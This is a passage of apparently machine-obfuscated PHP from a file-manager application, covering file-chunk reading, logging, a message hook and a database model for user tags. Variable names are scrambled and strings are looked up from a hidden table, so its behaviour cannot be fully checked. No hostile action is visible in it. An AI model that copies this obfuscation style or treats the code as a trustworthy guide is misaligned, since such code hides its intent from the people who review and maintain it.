$Úí“ß€× = intval($ª‹¹Í‡ / $à¸ªŒª›) * $à¸ªŒª›; $Š½¡”µ¼ = ceil(($ª‹¹Í‡ + $ûçò½ïù) / $à¸ªŒª›) * $à¸ªŒª› - $Úí“ß€×; $°‚öÖ¼ñ = IO::fileSubstr($this->path, $Úí“ß€×, $Š½¡”µ¼); $¨»Û¢Ê[$Úí“ß€× . $ÓşÍÑ¦ê[12]] = $°‚öÖ¼ñ; ksort($¨»Û¢Ê); $§€æïÁÈ = substr($°‚öÖ¼ñ, $ª‹¹Í‡ - $Úí“ß€×, $ûçò½ïù); return $§€æïÁÈ; } private function log($¥ñØ³×, $‡¾£à‹ˆ) { $Æ­Ö­õ« =& $_SERVER[¤øïŠ‹²]; $Ù´Ù¦şŠ = timeFloat() - $this->timeStart; write_log(sprintf($Æ­Ö­õ«[1773], $¥ñØ³×, $this->info[$Æ­Ö­õ«[32]], $Ù´Ù¦şŠ, $‡¾£à‹ˆ), $Æ­Ö­õ«[1317]); } } class Message { function __construct() { } public function send($ïÕşŒò = '', $ÎÉãÌèì = array(), $äÈ’¼»® = "\x74\145\x78\164") { $Šú‰¯¿ =& $_SERVER[¤øïŠ‹²]; $©óƒéºÅ = array($Šú‰¯¿[33] => $Šú‰¯¿[1237], $Šú‰¯¿[181] => $ïÕşŒò); if (in_array($äÈ’¼»®, array($Šú‰¯¿[1237], $Šú‰¯¿[1774]))) { $©óƒéºÅ[$Šú‰¯¿[33]] = $äÈ’¼»®; } $ÎÉãÌèì = array($Šú‰¯¿[604] => isset($ÎÉãÌèì[$Šú‰¯¿[604]]) ? $ÎÉãÌèì[$Šú‰¯¿[604]] : $Šú‰¯¿[12], $Šú‰¯¿[691] => isset($ÎÉãÌèì[$Šú‰¯¿[691]]) ? $ÎÉãÌèì[$Šú‰¯¿[691]] : $Šú‰¯¿[12]); if (empty($ïÕşŒò) || empty($ÎÉãÌèì[$Šú‰¯¿[604]]) && empty($ÎÉãÌèì[$Šú‰¯¿[691]])) { return !1; } $Å’ˆ‘²ñ = array($Šú‰¯¿[1703] => $©óƒéºÅ, $Šú‰¯¿[1775] => $ÎÉãÌèì); Hook::trigger($Šú‰¯¿[1776], $Å’ˆ‘²ñ); } } goto f™íì‘ø¡; Aøù¯ÜÂã£: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($‹‡§Ì„Œ) { $À«ïê¨² =& $_SERVER[¤øïŠ‹²]; return array($À«ïê¨²[2243] => array($À«ïê¨²[2675] . USER_ID, $À«ïê¨²[2244])); } protected function ___listData() { $á¦çŸáù =& $_SERVER[¤øïŠ‹²]; $§ëˆ€ = array($á¦çŸáù[1916] => USER_ID, $á¦çŸáù[579] => array($á¦çŸáù[2247], 0)); $ÊÜóÚçí = $á¦çŸáù[2676]; $•àßØ¨ = $this->field($ÊÜóÚçí)->where($§ëˆ€)->order($á¦çŸáù[2249])->select(); return $•àßØ¨ ? $•àßØ¨ : array(); } protected function addToTag($ÑïùæÉ¸, $Õ…ÏÅ) { $ÆÀ„ª— =& $_SERVER[¤øïŠ‹²]; if (!Model($ÆÀ„ª—[2400])->listData($Õ…ÏÅ)) { return !1; } if (is_numeric($ÑïùæÉ¸)) { $ªœ¦ÉÆ = Model($ÆÀ„ª—[934])->pathInfo($ÑïùæÉ¸); if (!$ªœ¦ÉÆ) { return !1; } } else { $ªœ¦ÉÆ = IO::infoSimple($ÑïùæÉ¸); if (!$ªœ¦ÉÆ) { return !1; } $ö‘öÂ§ = $ªœ¦ÉÆ[$ÆÀ„ª—[32]]; $äÎõÚ£ = $ªœ¦ÉÆ[$ÆÀ„ª—[33]]; if (isset($ªœ¦ÉÆ[$ÆÀ„ª—[506]])) { $äÎõÚ£ = $ªœ¦ÉÆ[$ÆÀ„ª—[506]] == $ÆÀ„ª—[102] ? $ÆÀ„ª—[89] : $ÆÀ„ª—[243]; } } $ÀµËàÖ¢ = array($ÆÀ„ª—[1916] => USER_ID, $ÆÀ„ª—[579] => $Õ…ÏÅ, $ÆÀ„ª—[516] => $ÑïùæÉ¸, $ÆÀ„ª—[517] => $äÎõÚ£ ? $äÎõÚ£ : $ÆÀ„ª—[511], $ÆÀ„ª—[515] => $ö‘öÂ§ ? $ö‘öÂ§ : $ÆÀ„ª—[12], $ÆÀ„ª—[2135] => 0); if ($this->where($ÀµËàÖ¢)->find()) { return !1; } return $this->add($ÀµËàÖ¢); } protected function removeFromTag($‚ë‘¦Õ, $¥‚òññâ) { $°É—øõ =& $_SERVER[¤øïŠ‹²]; if (!Model($°É—øõ[2400])->listData($¥‚òññâ)) { return !1; } if (is_array($‚ë‘¦Õ)) { $‚ë‘¦Õ = array($°É—øõ[7], $‚ë‘¦Õ); } $¢´“æ­Í = array($°É—øõ[1916] => USER_ID, $°É—øõ[579] => $¥‚òññâ, $°É—øõ[516] => $‚ë‘¦Õ); return $this->where($¢´“æ­Í)->delete(); } protected function removeByTag($¨Ûş¼) { $÷´ØîÛ’ =& $_SERVER[¤øïŠ‹²]; if (!$¨Ûş¼) { return !1; } $Ûå¨¦Ø… = array($÷´ØîÛ’[1916] => USER_ID, $÷´ØîÛ’[579] => $¨Ûş¼); return $this->where($Ûå¨¦Ø…)->delete(); } protected function removeBySource($€ÖıÎéÊ) { $Ã§›ŠÆŠ =& $_SERVER[¤øïŠ‹²]; if (is_array($€ÖıÎéÊ)) { $€ÖıÎéÊ = array($Ã§›ŠÆŠ[7], $€ÖıÎéÊ); } $ï“ÏÛäß = array($Ã§›ŠÆŠ[1916] => USER_ID, $Ã§›ŠÆŠ[579] => array($Ã§›ŠÆŠ[1130], 0), $Ã§›ŠÆŠ[516] => $€ÖıÎéÊ); return $this->where($ï“ÏÛäß)->delete(); } }